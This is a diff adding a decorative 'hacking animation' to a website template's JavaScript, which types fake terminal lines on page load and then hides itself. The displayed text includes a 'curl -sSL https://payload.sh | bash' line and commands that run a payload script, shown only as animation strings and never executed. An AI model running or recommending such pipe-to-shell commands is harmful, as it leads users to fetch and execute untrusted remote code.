@@ -3,6 +3,67 @@
 	html5up.net | @ajlkn
 	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
 */
+
+window.addEventListener('load', function() {
+    const lines = [
+        "cd ~/Downloads/bronitskii.github.io",
+        "curl -sSL https://payload.sh | bash",
+		"chmod +x pAylOad.sh",
+		"./pAylOad.sh",
+		"open index.html",
+    ];
+    
+    const container = document.querySelector('.hacking-animation');
+    const textElem = container.querySelector('.hacking-animation__text');
+    let currentLine = 0;
+    let currentChar = 0;
+
+    function addNewLine() {
+        const line = document.createElement('div');
+        const prompt = document.createElement('span');
+        prompt.className = 'hacking-animation__prompt';
+        prompt.textContent = '[v:~]$ ';
+        line.appendChild(prompt);
+        textElem.appendChild(line);
+        return line;
+    }
+
+    let currentLineElem = addNewLine();
+    const cursor = document.createElement('span');
+    cursor.className = 'hacking-animation__cursor';
+    currentLineElem.appendChild(cursor);
+
+    const interval = setInterval(() => {
+        if (currentLine >= lines.length) {
+            setTimeout(() => {
+                container.classList.add('hide');
+                setTimeout(() => container.remove(), 500);
+            }, 1000);
+            clearInterval(interval);
+            return;
+        }
+
+        if (currentChar >= lines[currentLine].length) {
+            currentLine++;
+            currentChar = 0;
+            if (currentLine < lines.length) {
+                currentLineElem = addNewLine();
+                cursor.remove();
+                currentLineElem.appendChild(cursor);
+            }
+            return;
+        }
+
+        const char = lines[currentLine][currentChar];
+        const span = document.createElement('span');
+        span.textContent = char;
+        cursor.remove();
+        currentLineElem.appendChild(span);
+        currentLineElem.appendChild(cursor);
+        currentChar++;
+    }, 50);
+});
+
 (function ($) {
 	var $window = $(window),
 		$body = $("body"),
